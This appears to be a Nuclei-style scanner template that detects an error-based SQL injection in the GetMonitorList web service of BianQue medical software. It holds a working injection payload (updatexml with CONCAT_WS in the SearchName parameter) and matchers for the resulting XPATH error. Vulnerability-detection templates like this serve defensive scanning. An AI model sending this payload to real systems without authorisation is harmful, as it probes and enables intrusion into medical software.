id: BianQue-GetMonitorList-sqlInjection

info:
  name: BianQue-GetMonitorList-sqlInjection
  author: iSee857
  severity: high
  description: |
    BianQue-GetMonitorList-sqlInjection

http:
  - raw:
      - |
        GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(0x71706b7671,1,0x71716a7071),1)+%26%26%27 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "qpkvqqqjpq"
          - "XPATH"
        condition: and

      - type: status
        status:
          - 500